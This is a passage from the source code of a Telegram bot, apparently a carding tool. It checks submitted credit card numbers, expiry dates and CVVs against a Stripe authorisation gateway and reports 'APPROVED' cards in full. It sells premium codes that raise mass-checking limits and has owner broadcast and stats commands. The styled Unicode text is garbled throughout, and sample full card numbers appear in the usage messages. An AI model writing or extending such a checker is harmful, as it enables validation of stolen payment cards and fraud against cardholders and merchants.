ð™ð™¨ð™š /chk ð™ð™ð™–ð™£ ð™€ð™£ð™©ð™šð™§ ð™”ð™¤ð™ªð™§ ð˜¾ð™˜

ð—¨ð˜€ð—®ð—´ð—² âžœ `/chk 4879170029890689|02|2027|347`
        """)
        return
    
    cc_input = " ".join(context.args)
    valid_ccs = simple_cc_parser(cc_input)
    
    if not valid_ccs:
        await update.message.reply_text(f"""
âŒ ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—–ð—– ð—³ð—¼ð—¿ð—ºð—®ð˜!

ðŸ“ ð—©ð—®ð—¹ð—¶ð—± ð—™ð—¼ð—¿ð—ºð—®ð˜ð˜€:
â€¢ `4147768578745265|04|2026|168`
ðŸ”§ ð—¬ð—¼ð˜‚ð—¿ ð—œð—»ð—½ð˜‚ð˜: `{cc_input}`
        """, parse_mode='Markdown')
        return
    
    cc_number, month, year, cvv = valid_ccs[0]
    card_type = detect_card_type(cc_number)
    bin_number = cc_number[:6]
    
    bin_info = bin_lookup(bin_number)
    processing_msg = await update.message.reply_text(f"""
â³ ð—£ð—¿ð—¼ð—°ð—²ð˜€ð˜€ð—¶ð—»ð—´ ð—–ð—®ð—¿ð—±...

ðŸ’³ ð—–ð—®ð—¿ð—±: `{cc_number}`
ðŸ·ï¸ ð—§ð˜†ð—½ð—²: {card_type}
ðŸ†” ð—•ð—œð—¡: {bin_number}

â³ð˜½ð™¤ð™© ð˜½ð™® âžœ @cyber_world_Xdd
    """, parse_mode='Markdown')
    
    status, process_time, api_response = check_cc(cc_number, month, year, cvv)
    
    if status == "approved":
        # âœ… ORIGINAL SINGLE CHECK APPROVED MESSAGE
        result_text = f"""
ð˜¼ð™‹ð™‹ð™ð™Šð™‘ð™€ð˜¿ âœ…

ð—–ð—– â‡¾ `{cc_number}|{month}|{year}|{cvv}`
ð—šð—®ð˜ð—²ð™¬ð™–ð™® â‡¾ Stripe Auth
ð—¥ð—²ð˜€ð—½ð—¼ð—»ð˜€ð—² â‡¾ Payment added successfully

```
ð—•ð—œð—¡ ð—œð—»ð—³ð—¼ âžœ  {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}
ð—•ð—®ð—»ð—¸ âžœ  {bin_info.get('bank', 'N/A')}
ð—–ð—¼ð˜‚ð—»ð˜ð—¿ð˜† âžœ  {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}```

ð—§ð—¼ð—¼ð—¸ {process_time} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€
        """
    else:
        result_text = f"""
ð˜¿ð™šð™˜ð™¡ð™žð™£ð™šð™™ âŒ

ð—–ð—®ð—¿ð—± â‡¾ {cc_number}
ð—§ð˜†ð—½ð—² â‡¾ {card_type}
ð—šð—®ð˜ð—²ð™¬ð™–ð™® â‡¾ Stripe Auth
ð—¥ð—²ð˜€ð—½ð—¼ð—»ð˜€ð—² â‡¾ {api_response[:100] + '...' if api_response and len(api_response) > 100 else api_response or 'Declined'}

```
ð—•ð—œð—¡ ð—œð—»ð—³ð—¼ âžœ  {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}
ð—•ð—®ð—»ð—¸ âžœ  {bin_info.get('bank', 'N/A')}
ð—–ð—¼ð˜‚ð—»ð˜ð—¿ð˜† â‡¾ {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}```

ð—§ð—¶ð—ºð—² â‡¾ {process_time} seconds
        """
    
    await processing_msg.edit_text(result_text, parse_mode='Markdown')

# [REST OF PREMIUM CODE FUNCTIONS REMAIN EXACTLY THE SAME...]
# Premium Code System
def generate_premium_code(days):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO premium_codes (code, days, created_at) VALUES (?, ?, ?)", (code, days, time.time()))
    conn.commit()
    conn.close()
    return code

async def code_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("âŒ Owner command only!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /code <days>")
        return
    try:
        days = int(context.args[0])
        code = generate_premium_code(days)
        await update.message.reply_text(f"""
ðŸ’Ž ð—£ð—¿ð—²ð—ºð—¶ð˜‚ð—º ð—–ð—¼ð—±ð—² ð—šð—²ð—»ð—²ð—¿ð—®ð˜ð—²ð—±!
ð—–ð—¼ð—±ð—²: `{code}`
ð——ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—»: {days} days
ðŸ”§ ð—¨ð˜€ð—®ð—´ð—²: /redeem {code}
        """, parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("âŒ Invalid days format!")

async def redeem_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("âŒ Join our channel first!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    code = context.args[0].upper()
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT days FROM premium_codes WHERE code=? AND used_by IS NULL", (code,))
    result = c.fetchone()
    if not result:
        await update.message.reply_text("âŒ Invalid or already used code!")
        conn.close()
        return
    days = result[0]
    expires_at = time.time() + (days * 24 * 60 * 60)
    c.execute("UPDATE premium_codes SET used_by=? WHERE code=?", (user_id, code))
    c.execute("UPDATE users SET status='premium' WHERE user_id=?", (user_id,))
    c.execute("INSERT INTO redeemed (user_id, code, redeemed_at, expires_at) VALUES (?, ?, ?, ?)", (user_id, code, time.time(), expires_at))
    conn.commit()
    conn.close()
    expiry_date = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M:%S")
    await update.message.reply_text(f"""
ðŸŽ‰ ð—£ð—¿ð—²ð—ºð—¶ð˜‚ð—º ð—”ð—°ð˜ð—¶ð˜ƒð—®ð˜ð—²ð—±!
âœ… You are now a Premium User!
ðŸ“… Expires: {expiry_date}
ðŸ”§ Features unlocked:
   â€¢ Mass check limit: {PREMIUM_LIMIT} CCs
   â€¢ Priority processing
ðŸ’Ž Thank you for supporting!
    """)

async def broadcast_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = ' '.join(context.args)
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    sent, failed = 0, 0
    for (user_id,) in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"""
ðŸ“¢ ð—•ð—¿ð—¼ð—®ð—±ð—°ð—®ð˜€ð˜ ð—–ð—¼ð—ºð—½ð—¹ð—²ð˜ð—²!
âœ… Sent: {sent}
âŒ Failed: {failed}
    """)

async def stats_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='free'")
    free_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE status='premium'")
    premium_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM premium_codes WHERE used_by IS NOT NULL")
    used_codes = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM premium_codes WHERE used_by IS NULL")
    available_codes = c.fetchone()[0]
    conn.close()
    stats_text = f"""
ðŸ“Š ð—•ð—¼ð˜ ð—¦ð˜ð—®ð˜ð—¶ð˜€ð˜ð—¶ð—°ð˜€
ðŸ‘¥ ð—¨ð˜€ð—²ð—¿ð˜€:
â€¢ Total Users: {total_users}
â€¢ Free Users: {free_users}
â€¢ Premium Users: {premium_users}
ðŸ’Ž ð—£ð—¿ð—²ð—ºð—¶ð˜‚ð—º ð—¦ð˜†ð˜€ð˜ð—²ð—º:
â€¢ Used Codes: {used_codes}
â€¢ Available Codes: {available_codes}
ðŸ”§ ð—Ÿð—¶ð—ºð—¶ð˜ð˜€:
â€¢ Free: {FREE_LIMIT} CCs
â€¢ Premium: {PREMIUM_LIMIT} CCs
â€¢ Owner: {OWNER_LIMIT} CCs
    """
    await update.message.reply_text(stats_text)

# ERROR HANDLER
async def error_handler(update: Update, context: CallbackContext):
    """Handle errors gracefully"""
    logger.error(f"Exception while handling an update: {context.error}")
    
    try:
        # Notify owner about the error
        if OWNER_ID:
            error_msg = f"ðŸš¨ Bot Error:\n{context.error}"
            await context.bot.send_message(chat_id=OWNER_ID, text=error_msg)
    except:
        pass

def main():
    """Main function with auto-restart protection"""
    init_db()
    
    # Create application with error handler
    application = Application.builder().token(TOKEN).build()
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mtxt", mtxt_manual_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("code", code_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Add document handler for auto file detection
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Add custom message handler for dot commands
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_custom_commands))
    
    # Add callback handler for buttons
    application.add_handler(CallbackQueryHandler(handle_button))
    
    # Start the bot with auto-restart
    print("ðŸ¤– Bot is starting...")
    print("ðŸŽ¯ AUTO FILE DETECTION ACTIVATED!")
    print("ðŸš€ Interactive Button Interface Ready!")
    print("ðŸ’³ Full CC display in approved messages!")
    print("ðŸ›¡ï¸  Auto-restart protection enabled!")
    print("ðŸ”˜ Vertical button layout implemented!")
    print("ðŸ›‘ Military-grade stop system activated!")
    
    # Run with persistent polling
    while True:
        try:
            application.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES,
                timeout=30,
                pool_timeout=30
            )
        except Exception as e:
            logger.error(f"Bot crashed: {e}")
            print(f"ðŸš¨ Bot crashed: {e}")
            print("ðŸ”„ Restarting in 10 seconds...")
            time.sleep(10)
            print("ðŸ”„ Restarting bot now...")

if __name__ == '__main__':
    main()
